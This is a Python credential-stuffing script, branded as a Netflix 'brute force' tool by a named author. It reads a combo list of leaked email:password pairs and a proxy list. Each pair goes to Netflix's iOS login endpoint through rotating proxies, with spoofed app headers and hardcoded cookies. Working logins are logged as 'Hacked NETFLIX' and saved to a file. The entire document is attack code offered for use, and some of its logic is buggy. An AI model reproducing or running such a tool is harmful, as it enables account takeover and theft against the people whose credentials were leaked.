import requests, random, time, threading, os
from user_agent import generate_user_agent
mylock = threading.Lock()
def sprint(*a, **b):
    with mylock:
        print(*a, **b)
r = requests.session()

print("""[$]BRUTE FORCE
    _   _      _    __ _ _ 
   | \ | | ___| |_ / _| (_)_  __
   |  \| |/ _ \ __| |_| | \ \/ /
   | |\  |  __/ |_|  _| | |>  <
   |_| \_|\___|\__|_| |_|_/_/\_\ 
 
BY Mustafa Kurdish @tweakjailbreak
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n""")
url = 'https://ios.prod.http1.netflix.com/iosui/user/10.19'
headers = {
    "Host": "ios.prod.http1.netflix.com",
    "Cookie": "flwssn=74266376-523d-48c3-9bc3-8a009e804a37; memclid=TkZBUFBMLTAyLUlQSE9ORTk9NC1ENUJBN0IxQTAyNTI0NTM2OEQ0QUEzMjNFOTg3NDMzQzUyQzZGQjRCNjczRTg1NjIxRUEzMDFENDQ0RUM3OEIx; nfvdid=BQFmAAEBENN4QjtTnSS8VW_4WDVPc45gbv8HGuY3dcUdp9_6Xb6d_vcJbqU4lp2n8cm8kaOYxAGr7OI5JciXNkgH-zvKmtkUQcWfMkOj3TvuMtezrkns7ZtQcfAcFOutfzGV9LhYM1QKbizWrz0uHkFoHMVbhNYl",
    "Content-Type": "application/x-www-form-urlencoded",
    "X-Netflix.argo.abtests": "",
    "X-Netflix.client.appversion": "10.19.0",
    "Accept": "*/*",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "ar-US;q=1, en-US;q=0.9",
    "Content-Length": "1851",
    "X-Netflix.client.idiom": "phone",
    "User-Agent": generate_user_agent(),
    "X-Netflix.client.type": "argo",
    "X-Netflix.nfnsm": "9",
    "Connection": "close"}
proxy = []
def NT(emailss):
    try:
        global running
        running += 1
    except:
        running = 0
    try:
        email = emailss.split(":")[0]
        pess = emailss.split(":")[1]
        domn = emailss.split("@")[0]
        run = str(random.choice(proxy))
        PROXY = {
            "https": f"http://{run}",
            "http": f"https://{run}"}
        HALK = f"""
Hacked NETFLIX ✅:
Email: {email}
pass: {pess}
==========="""
        ERRps = f"""
Password is not correct ❌:
Email: {email}
pass: {pess}
==========="""
        ERR = f"""
NOT Hacked NETFLIX ❌:
Email: {email}
pass: {pess}
==========="""
        data = f'appInternalVersion=10.19.0&appVersion=10.19.0&callPath=%5B%22moneyball%22%2C%22appleSignUp%22%2C%22next%22%5D&config=%7B%22useSecureImages%22%3Atrue%2C%22volatileBillboardEnabled%22%3A%22false%22%2C%22kidsTrailers%22%3Atrue%2C%22kidsBillboardEnabled%22%3A%22true%22%2C%22interactiveFeaturePIBEnabled%22%3A%22true%22%2C%22showMoreDirectors%22%3Atrue%2C%22roarEnabled%22%3A%22true%22%2C%22warmerHasGenres%22%3Atrue%2C%22aroGalleriesEnabled%22%3A%22false%22%2C%22verticalBillboardEnabled%22%3A%22true%22%2C%22previewsRowEnabled%22%3A%22true%22%2C%22contentRefreshEnabled%22%3A%22false%22%2C%22interactiveFeatureStretchBreakoutEnabled%22%3A%22true%22%2C%22interactiveFeatureBuddyEnabled%22%3A%22true%22%2C%22interactiveFeatureAlexaAndKatieCharacterEnabled%22%3A%229.57.0%22%2C%22titleCapabilityFlattenedShowEnabled%22%3A%22true%22%2C%22kidsMyListEnabled%22%3A%22true%22%2C%22billboardEnabled%22%3A%22true%22%2C%22interactiveFeatureBadgeIconTestEnabled%22%3A%229.57.0%22%2C%22shortformRowEnabled%22%3A%22false%22%2C%22kidsUIOnPhone%22%3Afalse%2C%22contentWarningEnabled%22%3A%22true%22%2C%22billboardPredictionEnabled%22%3A%22false%22%2C%22billboardKidsTrailerEnabled%22%3A%22false%22%2C%22billboardTrailerEnabled%22%3A%22false%22%2C%22bigRowEnabled%22%3A%22true%22%7D&device_type=NFAPPL-02-&esn=NFAPPL-02-IPHONE9%3D4-D5BA7B1A025245368D4AA323E987433C52C6FB4B673E85621EA301D444EC78B1&idiom=phone&iosVersion=14.3&isTablet=false&kids=false&maxDeviceWidth=414&method=call&model=saget&modelType=IPHONE9-4&odpAware=true&param=%7B%22action%22%3A%22loginAction%22%2C%22fields%22%3A%7B%22email%22%3A%22{email}%40{domn}%22%2C%22rememberMe%22%3A%22true%22%2C%22password%22%3A%22{pess}%22%7D%2C%22verb%22%3A%22POST%22%2C%22mode%22%3A%22login%22%2C%22flow%22%3A%22appleSignUp%22%7D&pathFormat=graph&pixelDensity=3.0&progressive=false&responseFormat=json'
        Go = r.post(url, headers=headers, data=data, proxies=PROXY)
        if '"memberHome"' in Go.text:
            sprint(f'{HALK}')
            with open('NWE-NETFLIX.txt', 'a') as x:
              x.write(emailss+' |@tweakjailbreak'+'\n')
        elif '"incorrect_password"':
            sprint(f'{ERRps}')
        else:
            sprint(f'{ERR}')
        running -= 1
    except requests.exceptions.ConnectionError:
        sprint('[-] BAD PROXY !!')
        running -= 1
emails = []
def tret(files, pro):
    eml = open(files, 'r').read().splitlines()
    for emls in eml:
        emails.append(emls)
    proxies = open(pro, 'r').read().splitlines()
    for pro in proxies:
        proxy.append(pro)
    max = 1
    running = 0
    for emailss in emails:
        if running < max:
            x = threading.Thread(target=NT, args=(emailss,))
            x.start()
def file():
    files = input('[+] Enter the name of the Combo file: ')
    if os.path.exists(files):
        pass
    else:
        print("Not Found !!!")
        return file()
    pro = input('[+] Enter the name of the proxies file: ')
    if os.path.exists(pro):
        pass
    else:
        print("Not Found !!!")
        return file()
    tret(files, pro)
